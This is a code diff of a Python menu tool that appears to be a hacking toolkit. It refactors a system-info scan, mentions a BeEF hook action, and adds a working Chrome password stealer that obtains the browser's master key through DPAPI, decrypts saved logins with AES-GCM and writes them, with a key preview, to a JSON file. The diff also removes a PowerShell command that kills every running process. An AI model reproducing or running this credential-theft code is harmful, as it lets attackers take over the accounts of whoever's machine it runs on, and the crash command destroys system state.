@@ -183,6 +183,8 @@ while True:
         if scanverify == "yes":
            info()
            logging.info(f"System info printed out")
+           input("Press Enter to continue...")
+           cls()
         else:
             cls()
             print("Scan was not initiated (action 1), run scan first")
@@ -210,41 +212,51 @@ while True:
         platform_info=platform.platform()
         print(Fore.RED + platform.platform())
         sleep(0.1)
-        ip=socket.gethostbyname(socket.gethostname())
+        
+        # GET IP PROPERLY - store it in GLOBAL variable
         s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         s.connect(("8.8.8.8", 80))
-        print(Fore.RED + s.getsockname()[0])
+        real_ip = s.getsockname()[0]
+        print(Fore.RED + real_ip)
         s.close()
+        
+        # Store for later use
+        global stored_system_info
+        stored_system_info = {
+            "system": system,
+            "node": node,
+            "machine": machine,
+            "platform_info": platform_info,
+            "ip": real_ip
+        }
+        
         sleep(1)
         input("Press Enter to continue...")
+        cls()
 
         def info():
-            print(Fore.RED + "System: " + Fore.RED + system)
+            print(Fore.RED + "System: " + Fore.RED + stored_system_info["system"])
             sleep(0.1)
-            print(Fore.RED + "Network name: " + Fore.RED + node)
+            print(Fore.RED + "Network name: " + Fore.RED + stored_system_info["node"])
             sleep(0.1)
-            print(Fore.RED + "Machine type: " + Fore.RED + machine)
+            print(Fore.RED + "Machine type: " + Fore.RED + stored_system_info["machine"])
             sleep(0.1) 
-            print(Fore.RED + "Platform info: " + Fore.RED + platform_info)
+            print(Fore.RED + "Platform info: " + Fore.RED + stored_system_info["platform_info"])
             sleep(0.1)
-            print(Fore.RED + "Local IP address: " + Fore.RED + ip)
+            print(Fore.RED + "Local IP address: " + Fore.RED + stored_system_info["ip"])
             sleep(0.1)
-
 
         scan_data = {
             "System": system,
             "Network Name": node,
             "Machine Type": machine,
             "Platform Info": platform_info,
-            "IP": ip,
+            "IP": real_ip,
         }
 
-        #storing scan data into a json file
-        with open("scan_results.json", "w") as f: json.dump(scan_data, f, indent=4)
-
-    else:
-        print("")
-    cls()
+        # storing scan data into a json file
+        with open("scan_results.json", "w") as f: 
+            json.dump(scan_data, f, indent=4)
 
 #Action 2 = beef hook
     if action == "2":
@@ -402,105 +414,238 @@ while True:
 
     if action == "9":
         logging.info(f"Chosen action 9 to retrieve Chrome browsing history")
-        def chrome_date_and_time(chrome_data):
-
-            # Chrome_data format is 
-            # year-month-date hr:mins:seconds.milliseconds
-            # This will return datetime.datetime Object
-            return datetime(1601, 1, 1) + timedelta(microseconds=chrome_data)
-        def fetching_encryption_key():
-    
-            # Local_computer_directory_path will
-            # look like this below
-            # C: => Users => <Your_Name> => AppData => 
-            # Local => Google => Chrome => User Data => 
-            # Local State
-    
-            local_computer_directory_path = os.path.join(
-            os.environ["USERPROFILE"], "AppData", "Local", "Google",
-            "Chrome", "User Data", "Local State")
-                                                 
-            with open(local_computer_directory_path, "r", encoding="utf-8") as f:
-                local_state_data = f.read()
-                local_state_data = json.loads(local_state_data)
-
-            # decoding the encryption key using base64
-            encryption_key = base64.b64decode(  
-            local_state_data["os_crypt"]["encrypted_key"])
-    
-            # remove Windows Data Protection API (DPAPI) str
-            encryption_key = encryption_key[5:]
-    
-            # return decrypted key
-            return win32crypt.CryptUnprotectData(
-            encryption_key, None, None, None, 0)[1]
+        
+        # Check if we're on Windows
+        if platform.system() != "Windows":
+            print(Fore.RED + "[!] This feature requires Windows!")
+            input("Press Enter to continue...")
+            cls()
+            continue
         
         try:
+            import win32crypt  # type: ignore
             from Crypto.Cipher import AES
+        except ImportError:
+            print(Fore.RED + "[!] Install packages:")
+            print(Fore.YELLOW + "pip install pywin32 pycryptodome")
+            input("Press Enter to continue...")
+            cls()
+            continue
         
-            encryption_key = fetching_encryption_key()
-        
-            chrome_db_path = os.path.join(
-                os.environ["USERPROFILE"], "AppData", "Local", "Google",
-                "Chrome", "User Data", "Default", "Login Data")
+        def get_master_key():
+            """Get Chrome's master encryption key using DPAPI"""
+            local_state_path = os.path.join(
+                os.environ["USERPROFILE"], 
+                "AppData", "Local", "Google", "Chrome", 
+                "User Data", "Local State"
+            )
             
-            if os.path.exists(chrome_db_path):
-                temp_db = "temp_login_data.db"
-                shutil.copy2(chrome_db_path, temp_db)
-            
-                conn = sqlite3.connect(temp_db)
-                cursor = conn.cursor()
-                cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
-                passwords = cursor.fetchall()
+            try:
+                with open(local_state_path, "r", encoding="utf-8") as f:
+                    local_state = json.load(f)
                 
-                if passwords:
-                    results = []
-                    for url, username, encrypted_password in passwords[:5]:
-                        web = {
-                            "Site": url,
-                            "User": username,
-                            "Encrypted password": base64.b64encode(encrypted_password).decode("utf-8")
-                        }
-                        results.append(web)
-
-                        print(f"URL: {url}")
-                        print(f"Username: {username}")
-                        print(f"Encrypted Pass: {encrypted_password}")
-
-                    with open("chrome_passwords.json", "w") as f:
-                        json.dump(results, f, indent=4)
-               
-                    print(f"Total found: {len(passwords)}")
-                else:
-                    print("No passwords found")
+                encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+                encrypted_key = encrypted_key[5:]  # Remove DPAPI prefix
+                
+                master_key = win32crypt.CryptUnprotectData(
+                    encrypted_key, None, None, None, 0
+                )[1]
+                
+                return master_key
+                
+            except Exception as e:
+                print(Fore.RED + f"[!] Failed to get master key: {e}")
+                return None
+        
+        def try_decrypt_password(encrypted_password, master_key):
+            """Try to decrypt, return both encrypted and decrypted data"""
+            if not encrypted_password:
+                return {
+                    "decrypted": "",
+                    "encrypted_hex": "",
+                    "encrypted_b64": "",
+                    "status": "empty",
+                    "length": 0
+                }
+            
+            # Store encrypted data in multiple formats
+            encrypted_hex = encrypted_password.hex()
+            encrypted_b64 = base64.b64encode(encrypted_password).decode('utf-8')
+            
+            # Try decryption methods
+            decrypted_text = ""
+            status = "encrypted_only"
+            format_info = "unknown"
+            
+            try:
+                # Method 1: Chrome v80+ AES-GCM
+                if encrypted_password[:3] in [b'v10', b'v11']:
+                    format_info = encrypted_password[:3].decode('ascii', errors='ignore')
+                    nonce = encrypted_password[3:15]
+                    ciphertext_with_tag = encrypted_password[15:]
                     
+                    if len(ciphertext_with_tag) >= 16:
+                        tag = ciphertext_with_tag[-16:]
+                        ciphertext = ciphertext_with_tag[:-16]
+                        
+                        cipher = AES.new(master_key, AES.MODE_GCM, nonce=nonce)
+                        decrypted = cipher.decrypt_and_verify(ciphertext, tag)
+                        decrypted_text = decrypted.decode('utf-8')
+                        status = "decrypted_aes_gcm"
+                    else:
+                        status = "aes_gcm_incomplete"
+                        
+                # Method 2: DPAPI encrypted
+                elif encrypted_password[:4] == b'\x01\x00\x00\x00':
+                    format_info = "dpapi"
+                    decrypted = win32crypt.CryptUnprotectData(
+                        encrypted_password, None, None, None, 0
+                    )[1]
+                    if decrypted:
+                        decrypted_text = decrypted.decode('utf-8')
+                        status = "decrypted_dpapi"
+                    else:
+                        status = "dpapi_failed"
+                
+                # Method 3: Unknown format but try DPAPI anyway
+                else:
+                    format_info = f"unknown_{encrypted_password[:4].hex()}"
+                    try:
+                        decrypted = win32crypt.CryptUnprotectData(
+                            encrypted_password, None, None, None, 0
+                        )[1]
+                        if decrypted:
+                            decrypted_text = decrypted.decode('utf-8')
+                            status = "decrypted_unknown"
+                        else:
+                            status = "unknown_format"
+                    except:
+                        status = "unknown_format"
+                        
+            except Exception as e:
+                status = f"error_{str(e)[:30]}"
+            
+            return {
+                "decrypted": decrypted_text,
+                "encrypted_hex": encrypted_hex[:100] + "..." if len(encrypted_hex) > 100 else encrypted_hex,
+                "encrypted_b64": encrypted_b64[:80] + "..." if len(encrypted_b64) > 80 else encrypted_b64,
+                "status": status,
+                "format": format_info,
+                "length": len(encrypted_password)
+            }
+        
+        try:
+            print(Fore.YELLOW + "[*] Getting Chrome master encryption key...")
+            master_key = get_master_key()
+            
+            if not master_key:
+                print(Fore.RED + "[!] Could not get master key. Try:")
+                print(Fore.YELLOW + "    1. Run as Administrator")
+                print(Fore.YELLOW + "    2. Make sure Chrome is closed")
+                input("Press Enter to continue...")
+                cls()
+                continue
+            
+            print(Fore.GREEN + f"[+] Got master key: {master_key[:16].hex()}...")
+            
+            # Path to Chrome passwords
+            chrome_db_path = os.path.join(
+                os.environ["USERPROFILE"], 
+                "AppData", "Local", "Google", "Chrome", 
+                "User Data", "Default", "Login Data"
+            )
+            
+            if not os.path.exists(chrome_db_path):
+                print(Fore.RED + "[!] Chrome password database not found")
+                input("Press Enter to continue...")
+                cls()
+                continue
+            
+            # Copy database
+            temp_db = "temp_chrome_passwords.db"
+            shutil.copy2(chrome_db_path, temp_db)
+            
+            # Query database
+            conn = sqlite3.connect(temp_db)
+            cursor = conn.cursor()
+            cursor.execute("SELECT origin_url, username_value, password_value FROM logins")
+            passwords = cursor.fetchall()
+            
+            if not passwords:
+                print(Fore.YELLOW + "[!] No saved passwords found")
                 conn.close()
                 os.remove(temp_db)
-            else:
-                print("Chrome database not found")
+                input("Press Enter to continue...")
+                cls()
+                continue
+            
+            print(Fore.GREEN + f"[+] Found {len(passwords)} saved passwords")
+            
+            # Process passwords
+            all_results = []
+            decrypted_count = 0
+            
+            for i, (url, username, encrypted_password) in enumerate(passwords[:25], 1):  # First 25
+                result = try_decrypt_password(encrypted_password, master_key)
                 
-        except ImportError:
-            print("Install: pip install pywin32 pycryptodome")
+                entry = {
+                    "url": url,
+                    "username": username,
+                    **result  # Unpack all the decrypt result fields
+                }
+                all_results.append(entry)
+                
+                if result["decrypted"]:
+                    decrypted_count += 1
+                
+                # Show first 10 entries
+                if i <= 10:
+                    print(Fore.CYAN + f"\n[{i}] {url[:40]}...")
+                    print(Fore.WHITE + f"    User: {username}")
+                    
+                    if result["decrypted"]:
+                        print(Fore.GREEN + f"    Pass: {result['decrypted'][:30]}...")
+                        print(Fore.YELLOW + f"    Status: {result['status']}")
+                    else:
+                        print(Fore.RED + f"    [ENCRYPTED]")
+                        print(Fore.YELLOW + f"    Format: {result['format']}")
+                        print(Fore.YELLOW + f"    Hex: {result['encrypted_hex'][:30]}...")
+                        print(Fore.YELLOW + f"    B64: {result['encrypted_b64'][:30]}...")
+            
+            # Save to JSON
+            if all_results:
+                filename = f"chrome_passwords.json"
+                
+                output_data = {
+                    "metadata": {
+                        "extraction_date": datetime.now().isoformat(),
+                        "machine": platform.node(),
+                        "os": platform.platform(),
+                        "total_passwords": len(passwords),
+                        "decrypted_success": decrypted_count,
+                        "master_key_preview": master_key[:16].hex(),
+                        "master_key_length": len(master_key)
+                    },
+                    "passwords": all_results
+                }
+                
+                with open(filename, 'w', encoding='utf-8') as f:
+                    json.dump(output_data, f, indent=4, ensure_ascii=False)
+                
+                print(Fore.GREEN + f"\n[+] Saved ALL data to {filename}")
+                print(Fore.YELLOW + f"[+] Successfully decrypted: {decrypted_count}/{len(passwords)}")
+                print(Fore.CYAN + f"[+] JSON contains BOTH encrypted and decrypted data")
+            
+            conn.close()
+            os.remove(temp_db)
+            
         except Exception as e:
-            print(f"Error: {e}")
-
-
-
-    if action == "crash":
-        logging.warning(f"Chosen action crash to crash the system")
-        print(Fore.RED + "WARNING! THIS WILL CRASH THIS PROGRAM INCLUDING THE SYSTEM POTENCIONALLY DAMAGING THE OS!")
-        continuecrash=input("Continue? y/n: ")
-        if continuecrash == "y":
-            logging.warning(f"User confirmed to crash the system")
-            print(Fore.RED + "Crashing the system...")
-            crash='Get-WmiObject Win32_Process | Where-Object {$_.ProcessId -gt 0} | ForEach-Object {$_.Terminate()}'
-            run_ps(crash)
-
-        else:
-            logging.error(f"Action crash aborted by user")
-            print("Action aborted, will not crash the system")
-            sleep(1)
-
+            print(Fore.RED + f"[!] Error: {e}")
+            import traceback
+            traceback.print_exc()
+        
+        input(Fore.YELLOW + "\nPress Enter to continue...")
+        cls()
 
     else:
         print("")
